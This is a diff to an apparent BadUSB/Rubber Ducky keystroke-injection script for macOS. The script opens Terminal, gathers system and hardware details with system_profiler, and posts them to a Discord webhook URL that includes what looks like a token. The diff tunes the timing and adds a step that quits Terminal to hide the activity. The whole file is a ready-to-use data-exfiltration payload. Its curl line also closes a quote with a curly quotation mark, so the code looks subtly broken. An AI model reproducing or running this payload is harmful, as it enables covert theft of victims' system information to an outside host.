@@ -1,9 +1,12 @@
 
+
+DELAY 1000
 GUI SPACE
-DELAY 2500
+DELAY 250
 STRING TERMINAL
 DELAY 250
 ENTER
+DELAY 250
 STRING sys=$(system_profiler SPSoftwareDataType SPHardwareDataType) 
 DELAY 500
 ENTER
@@ -11,3 +14,4 @@ DELAY 250
 STRING curl -X POST -H "Content-Type: application/x-www-form-urlencoded" --data-urlencode "content=$sys” https://discord.com/api/webhooks/1296512673327878145/0h0RYRZEzKa3mIOsSYOJFLbRcxs5KUBhxP1oBbWdbKqbPgzKvENd8yKmyxALnTnpylOL
 DELAY 750
 ENTER
+GUI q
